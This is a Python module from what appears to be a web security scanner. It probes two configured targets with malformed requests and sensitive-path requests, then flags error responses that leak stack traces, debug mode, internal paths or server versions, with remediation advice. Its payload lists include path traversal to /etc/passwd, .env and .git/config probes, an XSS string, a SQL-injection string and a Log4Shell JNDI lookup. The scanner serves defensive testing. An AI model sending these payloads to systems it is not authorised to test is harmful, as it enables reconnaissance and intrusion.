"""
Error Handling & Information Leakage Analyzer
Sends malformed requests to trigger error responses and checks for
stack traces, debug info, server internals, and verbose error messages.
"""

import re
from utils import (
    Finding, Severity, safe_request, print_banner, print_finding,
    get_target_base, get_auth_base
)

# Payloads designed to trigger error responses
ERROR_PAYLOADS = [
    # Invalid paths
    {"path": "/../../etc/passwd", "label": "Path traversal", "method": "GET"},
    {"path": "/.env", "label": "Dotenv file", "method": "GET"},
    {"path": "/admin", "label": "Admin panel probe", "method": "GET"},
    {"path": "/debug", "label": "Debug endpoint", "method": "GET"},
    {"path": "/trace", "label": "Trace endpoint", "method": "GET"},
    {"path": "/server-status", "label": "Apache server-status", "method": "GET"},
    {"path": "/nginx_status", "label": "Nginx status", "method": "GET"},
    {"path": "/phpinfo.php", "label": "PHP info", "method": "GET"},
    {"path": "/actuator", "label": "Spring Boot Actuator", "method": "GET"},
    {"path": "/actuator/health", "label": "Spring Actuator Health", "method": "GET"},
    {"path": "/actuator/env", "label": "Spring Actuator Env", "method": "GET"},
    {"path": "/__debug__", "label": "Debug page", "method": "GET"},
    {"path": "/graphql", "label": "GraphQL endpoint", "method": "GET"},
    {"path": "/graphql?query={__schema{types{name}}}", "label": "GraphQL introspection", "method": "GET"},
    {"path": "/api/v1", "label": "API v1 root", "method": "GET"},
    {"path": "/api/v2", "label": "API v2 root", "method": "GET"},
    {"path": "/wp-json", "label": "WordPress REST API", "method": "GET"},
    {"path": "/.git/config", "label": "Git config", "method": "GET"},
    {"path": "/.well-known/openid-configuration", "label": "OIDC config", "method": "GET"},
    {"path": "/health", "label": "Health endpoint", "method": "GET"},
    {"path": "/status", "label": "Status endpoint", "method": "GET"},
    {"path": "/metrics", "label": "Prometheus metrics", "method": "GET"},
    {"path": "/favicon.ico/%00", "label": "Null byte injection", "method": "GET"},
    {"path": "/api/auth/session", "label": "Session endpoint", "method": "GET"},
]

# HTTP methods to test
UNUSUAL_METHODS = ["TRACE", "TRACK", "OPTIONS", "DELETE", "PUT", "PATCH"]

# Patterns that indicate information leakage in error responses
LEAKAGE_PATTERNS = {
    "Stack Trace": {
        "patterns": [
            r"at\s+[\w.]+\([\w/.]+:\d+:\d+\)",  # JS stack trace
            r"Traceback \(most recent call last\)",  # Python
            r"at\s+\w+\.\w+\([\w/.]+\.java:\d+\)",  # Java
            r"Stack trace:",
            r"System\.Exception",  # .NET
            r"#\d+\s+[\w/.]+\(\d+\):",  # PHP
            r"Fatal error:",
            r"Parse error:",
            r"RuntimeError",
            r"TypeError:",
            r"ReferenceError:",
            r"SyntaxError:",
        ],
        "severity": Severity.HIGH,
        "cwe": "CWE-209",
    },
    "Debug Mode": {
        "patterns": [
            r"DEBUG\s*=\s*True",
            r"ASPNET_ENV\s*=\s*Development",
            r"NODE_ENV\s*=\s*development",
            r"debug\s*mode\s*is\s*on",
            r"Django\s+Debug\s+page",
            r"debugger\s+is\s+active",
            r"Werkzeug\s+Debugger",
        ],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-489",
    },
    "Internal Path": {
        "patterns": [
            r"/home/\w+/",
            r"/var/www/",
            r"/opt/\w+/",
            r"/usr/local/",
            r"C:\\\\(?:Users|Program Files|Windows)",
            r"/app/src/",
            r"/node_modules/",
            r"at Object\.\<anonymous\>",
        ],
        "severity": Severity.MEDIUM,
        "cwe": "CWE-200",
    },
    "Database Error": {
        "patterns": [
            r"SQL\s+syntax",
            r"mysql_",
            r"pg_query",
            r"ORA-\d+",
            r"SQLSTATE",
            r"Unclosed\s+quotation",
            r"unterminated\s+quoted\s+string",
            r"PostgreSQL",
            r"MongoDB",
            r"mongoose",
            r"sequelize",
            r"prisma",
        ],
        "severity": Severity.HIGH,
        "cwe": "CWE-209",
    },
    "Server Software": {
        "patterns": [
            r"Apache/[\d.]+",
            r"nginx/[\d.]+",
            r"IIS/[\d.]+",
            r"Express/[\d.]+",
            r"PHP/[\d.]+",
            r"Python/[\d.]+",
            r"OpenSSL/[\d.]+",
        ],
        "severity": Severity.LOW,
        "cwe": "CWE-200",
    },
    "Internal IP": {
        "patterns": [
            r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3})",
            r"(?:172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})",
            r"(?:192\.168\.\d{1,3}\.\d{1,3})",
        ],
        "severity": Severity.MEDIUM,
        "cwe": "CWE-200",
    },
}


def check_response_for_leakage(response_text: str, url: str, label: str) -> list[Finding]:
    """Check an HTTP response body for information leakage patterns."""
    findings = []

    for category, config in LEAKAGE_PATTERNS.items():
        for pattern in config["patterns"]:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                # Deduplicate
                unique_matches = list(set(matches))[:3]
                matched_text = ", ".join(str(m)[:60] for m in unique_matches)

                finding = Finding(
                    title=f"{category} leaked in error response ({label})",
                    category="Error Handling",
                    severity=config["severity"],
                    description=f"The error response from {label} contains {category.lower()} information. "
                                f"This helps attackers understand the application's internal structure.",
                    evidence=f"URL: {url}\nPattern: {category}\nMatched: {matched_text}",
                    impact=f"Exposed {category.lower()} reveals internal application details useful for targeted attacks",
                    remediation=f"Configure custom error pages that do not expose {category.lower()}. "
                                f"Ensure debug mode is disabled in production.",
                    cwe=config["cwe"],
                    owasp="A05:2021 Security Misconfiguration",
                    url=url,
                )
                findings.append(finding)
                print_finding(finding)
                break  # One finding per category per response

    return findings


def test_error_payloads(base_url: str, label: str) -> list[Finding]:
    """Send error-triggering payloads and analyze responses."""
    findings = []

    print(f"\n  Testing {len(ERROR_PAYLOADS)} error payloads on {label}...")

    # SPA Fingerprinting: Detect catch-all routing (Next.js / React)
    print("    Fingerprinting routing behavior (SPA catch-all detection)...")
    baseline_lengths = []
    for test_path in ["/nonexistent_12345", "/missing_67890", "/notfound_abcde"]:
        resp = safe_request(f"{base_url.rstrip('/')}{test_path}", timeout=5)
        if resp and resp.status_code == 200:
            baseline_lengths.append(len(resp.text))
            
    spa_baseline_len = None
    if len(baseline_lengths) >= 2 and len(set(baseline_lengths)) == 1:
        spa_baseline_len = baseline_lengths[0]
        print(f"    [INFO] Detected SPA catch-all route. Baseline length: {spa_baseline_len} bytes")
    elif baseline_lengths:
        print("    [INFO] Server returns 200 for missing pages, but lengths vary.")
    else:
        print("    [INFO] Standard routing detected (missing pages return 404).")

    for i, payload in enumerate(ERROR_PAYLOADS):
        url = f"{base_url.rstrip('/')}{payload['path']}"
        method = payload["method"]

        resp = safe_request(url, method=method, timeout=5, allow_redirects=True)
        if not resp:
            continue

        status = resp.status_code
        body = resp.text or ""

        # Log the probe
        print(f"    [{i+1:>2}/{len(ERROR_PAYLOADS)}] {payload['label']}: {status} ({len(body)} bytes)")

        # Check for interesting (non-error, non-redirect) responses
        if status == 200 and payload["path"] not in ("/health", "/status", "/robots.txt", "/favicon.ico"):
            # Filter SPA false positives (same length as the catch-all baseline)
            if spa_baseline_len is not None and abs(len(body) - spa_baseline_len) < 50:
                print(f"    [SKIP] {payload['label']} matches SPA catch-all baseline (false positive)")
                continue

            # This endpoint returned 200 — check if it's actually an error page or real content
            if any(kw in payload["path"] for kw in [".env", ".git", "debug", "actuator/env", "phpinfo", "server-status"]):
                finding = Finding(
                    title=f"Sensitive endpoint accessible: {payload['path']} on {label}",
                    category="Error Handling",
                    severity=Severity.HIGH if ".env" in payload["path"] or ".git" in payload["path"] else Severity.MEDIUM,
                    description=f"The endpoint {payload['path']} returned HTTP 200, suggesting it may be accessible. "
                                f"({payload['label']})",
                    evidence=f"URL: {url}\nStatus: {status}\nContent length: {len(body)} bytes\n"
                             f"Preview: {body[:200]}",
                    impact=f"Exposed {payload['label']} may reveal sensitive configuration, credentials, or internal details",
                    remediation=f"Block access to {payload['path']} via server configuration. Return 404 for sensitive paths.",
                    cwe="CWE-538",
                    owasp="A05:2021 Security Misconfiguration",
                    url=url,
                )
                findings.append(finding)
                print_finding(finding)

        # Check response body for information leakage
        if body and status >= 400:
            leak_findings = check_response_for_leakage(body, url, f"{label} → {payload['label']}")
            findings.extend(leak_findings)

    return findings


def test_http_methods(base_url: str, label: str) -> list[Finding]:
    """Test unusual HTTP methods."""
    findings = []

    print(f"\n  Testing unusual HTTP methods on {label}...")

    for method in UNUSUAL_METHODS:
        resp = safe_request(base_url, method=method, timeout=5, allow_redirects=False)
        if not resp:
            continue

        status = resp.status_code
        print(f"    {method}: {status}")

        # TRACE/TRACK is especially dangerous (Cross-Site Tracing)
        if method in ("TRACE", "TRACK") and status == 200:
            finding = Finding(
                title=f"HTTP {method} method enabled on {label}",
                category="Error Handling",
                severity=Severity.MEDIUM,
                description=f"The HTTP {method} method is enabled on {label}. "
                            f"This can be exploited for Cross-Site Tracing (XST) attacks to steal cookies with HttpOnly flag.",
                evidence=f"URL: {base_url}\n{method} → {status}\nResponse: {resp.text[:200] if resp.text else 'empty'}",
                impact="Cross-Site Tracing can bypass HttpOnly cookie protection in some scenarios",
                remediation=f"Disable HTTP {method} method on the server. In nginx: add 'if ($request_method = {method}) {{ return 405; }}'",
                cwe="CWE-16",
                owasp="A05:2021 Security Misconfiguration",
                url=base_url,
            )
            findings.append(finding)
            print_finding(finding)

        # DELETE/PUT returning 200 on the root URL is concerning
        elif method in ("DELETE", "PUT") and status == 200:
            finding = Finding(
                title=f"HTTP {method} method returns 200 on {label}",
                category="Error Handling",
                severity=Severity.LOW,
                description=f"The HTTP {method} method returns 200 OK on {label}. "
                            f"While this may be benign, it's worth verifying that destructive operations aren't accidentally exposed.",
                evidence=f"URL: {base_url}\n{method} → {status}",
                impact="Unexpected HTTP method handling could indicate overly permissive routing",
                remediation="Explicitly reject HTTP methods that aren't needed. Return 405 Method Not Allowed.",
                cwe="CWE-16",
                owasp="A05:2021 Security Misconfiguration",
                url=base_url,
            )
            findings.append(finding)
            print_finding(finding)

    return findings


def test_malformed_requests(base_url: str, label: str) -> list[Finding]:
    """Send malformed requests to trigger verbose errors."""
    findings = []

    print(f"\n  Testing malformed requests on {label}...")

    # 1. Oversized header
    print("    Oversized header...")
    resp = safe_request(
        base_url,
        headers={"X-Custom-Header": "A" * 8000},
        timeout=5,
    )
    if resp and resp.status_code >= 400:
        leak_findings = check_response_for_leakage(resp.text or "", base_url, f"{label} oversized header")
        findings.extend(leak_findings)

    # 2. Invalid Content-Type
    print("    Invalid Content-Type...")
    resp = safe_request(
        base_url,
        method="POST",
        headers={"Content-Type": "application/x-malformed-type"},
        timeout=5,
    )
    if resp and resp.status_code >= 400:
        leak_findings = check_response_for_leakage(resp.text or "", base_url, f"{label} bad content-type")
        findings.extend(leak_findings)

    # 3. Very long URL
    print("    Very long URL...")
    long_url = base_url.rstrip("/") + "/" + "A" * 5000
    resp = safe_request(long_url, timeout=5)
    if resp and resp.status_code >= 400:
        leak_findings = check_response_for_leakage(resp.text or "", long_url, f"{label} long URL")
        findings.extend(leak_findings)

    # 4. Special characters in path
    print("    Special characters...")
    for char_payload in [
        "/<script>alert(1)</script>",
        "/';DROP TABLE--",
        "/${jndi:ldap://test.com}",
        "/%00",
        "/%0d%0a",
    ]:
        resp = safe_request(
            base_url.rstrip("/") + char_payload,
            timeout=5,
            allow_redirects=True,
        )
        if resp and resp.status_code >= 400:
            leak_findings = check_response_for_leakage(
                resp.text or "", base_url + char_payload, f"{label} special chars"
            )
            findings.extend(leak_findings)

    return findings


def run() -> list[Finding]:
    """Run error handling analysis on all targets."""
    print_banner("ERROR HANDLING & INFORMATION LEAKAGE ANALYSIS")
    all_findings = []

    targets = [
        (get_target_base(), "Main Application"),
        (get_auth_base(), "Auth Service"),
    ]

    for url, label in targets:
        print(f"\n  === Error Analysis: {url} ({label}) ===")

        # Test error payloads
        payload_findings = test_error_payloads(url, label)
        all_findings.extend(payload_findings)

        # Test HTTP methods
        method_findings = test_http_methods(url, label)
        all_findings.extend(method_findings)

        # Test malformed requests
        malformed_findings = test_malformed_requests(url, label)
        all_findings.extend(malformed_findings)

    if not all_findings:
        all_findings.append(Finding(
            title="Error handling appears properly configured",
            category="Error Handling",
            severity=Severity.INFO,
            description="No information leakage was detected in error responses across all tested payloads and methods.",
            evidence=f"Tested {len(ERROR_PAYLOADS)} error payloads, {len(UNUSUAL_METHODS)} HTTP methods, "
                     f"and multiple malformed request types",
            impact="Positive — error pages do not leak sensitive internal details",
            remediation="Continue monitoring. Ensure custom error handlers remain in place after updates.",
            cwe="CWE-209",
            owasp="A05:2021 Security Misconfiguration",
            url=get_target_base(),
            status="not_vulnerable",
        ))

    print(f"\n  Total error handling findings: {len(all_findings)}")
    return all_findings


if __name__ == "__main__":
    results = run()
    print(f"\nCompleted. Found {len(results)} issues.")
